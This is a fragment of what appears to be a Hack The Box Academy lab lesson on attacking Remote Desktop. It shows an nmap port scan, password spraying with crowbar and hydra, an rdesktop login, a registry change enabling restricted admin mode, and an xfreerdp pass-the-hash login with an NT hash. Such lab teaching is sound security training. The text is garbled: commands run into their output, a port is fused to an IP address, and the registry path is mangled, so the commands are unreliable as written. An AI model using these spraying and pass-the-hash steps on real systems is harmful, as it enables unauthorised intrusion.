...
```
icantthinkofaname23@htb[/htb]`#nmap -Pn -p3389192.168.2.143Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
...
```
icantthinkofaname23@htb[/htb]`#catusernames.txtroot
test
user
guest
admin
...
```
icantthinkofaname23@htb[/htb]`#crowbar -b rdp -s192.168.220.142/32 -U users.txt -c'password123'2022-04-07 15:35:50 START
...
```
icantthinkofaname23@htb[/htb]`#hydra -L usernames.txt -p'password123'192.168.2.143 rdpHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
...
```
icantthinkofaname23@htb[/htb]`#rdesktop -u admin -p password123192.168.2.143Autoselecting keyboard map 'en-us' from locale
...
![Registry Editor showing path: HKEY_LOCAL_MACHINEYSTEMurrentControlSetontrolsa. Highlighted entry: DisableRestrictedAdmin, REG_DWORD, value 0.](https://academy.hackthebox.com/storage/modules/116/rdp_session-5.png)

Once the registry key is added, we can use`xfreerdp`with the option`/pth`to gain RDP access:

```
icantthinkofaname23@htb[/htb]`#xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
...
![Remote desktop session showing PowerShell on Windows Server 2012 R2. Command 'whoami' executed, output: 'superstoreewen'.](https://academy.hackthebox.com/storage/modules/116/rdp_session-6-2.png)
